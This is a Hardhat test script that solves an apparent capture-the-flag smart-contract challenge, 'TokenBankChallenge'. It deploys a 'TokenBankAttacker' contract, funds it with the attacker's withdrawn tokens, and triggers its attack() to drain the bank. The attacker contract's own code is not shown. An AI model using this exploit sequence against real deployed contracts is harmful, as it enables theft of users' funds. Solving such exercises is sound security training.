import { expect } from "chai";
import { BigNumber, utils } from "ethers";
import { ethers } from "hardhat";

describe("TokenBankChallenge", () => {
  it.only("Solves the challenge", async () => {
    const amount = utils.parseEther('1').mul(500000);

    const [deployer, attacker] = await ethers.getSigners();
    const contractFactory = await ethers.getContractFactory("TokenBankChallenge");
    const contract = await contractFactory.connect(deployer).deploy(attacker.address);
    await contract.deployed();

    const tokenAddress = await contract.token();
    const tokenFactory = await ethers.getContractFactory("SimpleERC223Token");
    const tokenContract = tokenFactory.attach(tokenAddress);

    const attackerContractFactory = await ethers.getContractFactory("TokenBankAttacker");
    const attackerContract = await attackerContractFactory.deploy(contract.address);
    await attackerContract.deployed();

    const bankToAttackerTx = await contract.connect(attacker).withdraw(amount);
    await bankToAttackerTx.wait();

    const approveTx = await tokenContract.connect(attacker).approve(attacker.address, amount)
    await approveTx.wait()
    
    const attackerToAttackerContractTx = await tokenContract.connect(attacker).transferFrom(attacker.address, attackerContract.address, amount);
    await attackerToAttackerContractTx.wait();

    const attackTx = await attackerContract.connect(attacker).attack();
    await attackTx.wait();

    expect(await contract.isComplete()).to.be.true;
  });
});